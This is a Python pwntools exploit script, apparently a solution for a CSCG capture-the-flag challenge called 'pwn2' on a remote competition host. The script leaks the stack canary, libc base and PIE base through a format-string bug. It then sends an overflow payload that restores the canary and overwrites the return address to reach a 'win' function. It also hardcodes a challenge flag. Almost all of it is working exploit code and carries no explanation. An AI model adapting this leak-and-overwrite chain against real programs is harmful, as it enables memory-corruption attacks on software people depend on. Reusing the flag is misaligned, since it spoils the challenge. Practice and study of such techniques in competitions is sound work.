from pwn import *


def fuzz(pwd=""):
    
    for i in range(39,45):
        p = process("./pwn2",level="error")

        p.recvline()
        p.sendline(flag)
        p.recvuntil("name:")
        p.sendline("AAAA %{}$lp".format(i))
        print(str(i) + " - " + p.recvuntil("spell:")[-46:-22])
        p.close()


#calculate libc base fiirst %p - 0x1eb723
libc_offset = 0x1eb723
pie_offset = 0x1574
win_offset = 0x1343
ret_offset = 0x153c

flag = "CSCG{NOW_PRACTICE_MORE}"
leak = "AAAA %1$1lp %39$lp %41$lp BBBB"
spell = "Expelliarmus\x00"
pad = cyclic(0xff+0xf)

p = remote("hax1.allesctf.net",9101)
#p = process("./pwn2")

print(p.recvline())
p.sendline(flag)
print(p.recvuntil("name:"))
p.sendline(leak)
tmp = p.recvuntil("spell:")

print(tmp)

canary = int(tmp.split()[-7],16)
libc_base = int(tmp.split()[-8],16) - libc_offset
pie_base = int(tmp.split()[-6],16) - pie_offset
win_fun = pie_base+win_offset
log.info("Stack Canary: {}".format(hex(canary)))
RBP = "BBBBBBBB"
ret = pie_base + ret_offset

log.info("PIE base addr: {}".format(hex(pie_base)))
log.info("LibC base addr: {}".format(hex(libc_base)))
log.info("WINgardium addr: {}".format(hex(win_fun)))
log.info("AAAAAAAA_ret operation: {}".format(hex(ret)))


raw_input("Exploit ?")
idx = cyclic_find("cnaacoaa")
#aaaabaaa
p.sendline(spell+pad[:idx]+p64(canary)+RBP+p64(ret)+p64(win_fun))
p.interactive()
